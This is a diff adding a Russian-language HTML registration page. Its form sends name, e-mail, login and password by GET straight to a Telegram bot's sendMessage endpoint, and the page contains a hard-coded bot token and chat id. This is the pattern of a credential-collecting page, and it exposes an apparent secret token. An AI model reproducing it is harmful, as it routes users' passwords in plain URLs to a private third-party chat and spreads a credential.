@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация</title>
+    <link rel="stylesheet" href="style2.css">
+    <script src="main.js"></script>
+</head>
+<body>
+    <div id="tmpl-request">
+        <h1 class="text-request">Регистрация</h1>
+       <div class="form">
+        <form id="send" target="blank" method="GET" action="https://api.telegram.org/bot5521315588:AAHgmnzbi4_ZoHfiMiEi19zHWXAvcd_dmS4/sendMessage">
+            <input name="chat_id" type="hidden" value="892205925">
+            <div class="form-text">Имя<span>*</span></div><br>
+            <input class="form-area" type="text" name="text" autocomplete="off" required>
+            <div class="form-text">E-mail<span>*</span></div><br>
+            <input class="form-area" type="e-mail" name="tel" autocomplete="off" required>
+            <div class="form-text">Логин</div><br>
+            <input class="form-area" type="text" name="text" autocomplete="off"><br>
+            <div class="form-text">Пароль</div><br>
+            <input class="form-area" type="text" name="text" autocomplete="off"><br>
+            <button class="form-submit" onclick="send()">Sign up</button>
+       </form>
+       <div id="demo"></div>
+       </div>
+    </div>
+</body>
+</html>
